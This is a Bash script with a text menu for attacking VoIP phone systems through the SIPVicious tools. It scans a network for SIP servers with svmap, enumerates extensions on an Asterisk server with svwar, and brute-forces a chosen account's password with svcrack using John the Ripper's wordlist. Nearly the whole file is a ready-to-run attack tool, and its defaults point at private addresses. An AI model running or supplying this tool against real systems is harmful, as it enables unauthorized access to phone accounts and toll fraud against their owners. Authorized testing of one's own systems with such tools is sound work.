#!/bin/bash


#===========================================
#	FUNCTIONS
#===========================================

GetUserChoice()
{
	userChoice=-1

	while [ "$userChoice" -lt 0 -o "$userChoice" -gt 5 ]; do
		ShowOptions
		read userChoice
	done

	return "$userChoice"
}

ShowOptions()
{
	echo 'What do you want to do ?'
	echo '1 - Set network address to scan'
	echo '2 - Set if you want to see details'
	echo '3 - Scan the network'
	echo '4 - Attack an Asterisk server'
	echo '5 - Crack an account'
	echo '0 - Quit\n'
}

ScanNetwork()
{
	result="No result"
			
	if [ "${2}" = "true" ]
	then
	 	result=`svmap "$1" | grep -Pzo "([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,4}" | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}"`
	else
	  	result=`svmap "$1"`
	fi
	
	echo "$result"
}

AttackAsteriskServer()
{
	svwar "$1" -m Invite
}

#===========================================
#	MAIN
#===========================================


### Initialising variables

network_adress="192.168.1.0/24" 
if [ ! -z "$1" ] 
then
	network_adress="$1"
fi

show_details="false"
if [ ! -z "$2" ] 
then
	show_details="$2"
fi

asterisk_server="192.168.1.15"
if [ ! -z "$3" ] 
then
	asterisk_server="$3"
fi

user_account=0
if [ ! -z "$4" ] 
then
	user_account="$4"
fi


### Do what the user wish to do

choice=-1
while [ "$choice" -ne 0 ]; do

	echo "\n\n-----------------------------------"
	echo "Network address : ${network_adress}"
	echo "Show details : ${show_details}"
	echo "Server Asterisk to attack : ${asterisk_server}"
	echo "User account : ${user_account}"
	echo "-----------------------------------"
	
	choice=-1
	GetUserChoice
	choice=$?

	case "$choice" in
		1) echo "Wich network address would you like to scan (192.168.1.0/24) :"
			read network_adress
		;;
		2) echo "Would you like to see details (true/false) ?"
			read show_details
		;;
		3) echo "Scanning ${network_adress} :"

			ScanNetwork "${network_adress}" "${show_details}"
		;;
		4) echo "Wich Asterisk server would you attack ? (192.168.1.15) :"
			read asterisk_server
			AttackAsteriskServer "$asterisk_server"
		;;
		5) echo "Wich account from ${asterisk_server} would you crack ? :"
			read user_account
			svcrack "$asterisk_server" -u "$user_account" -d /usr/share/john/password.lst
		;;
	esac
done

exit 0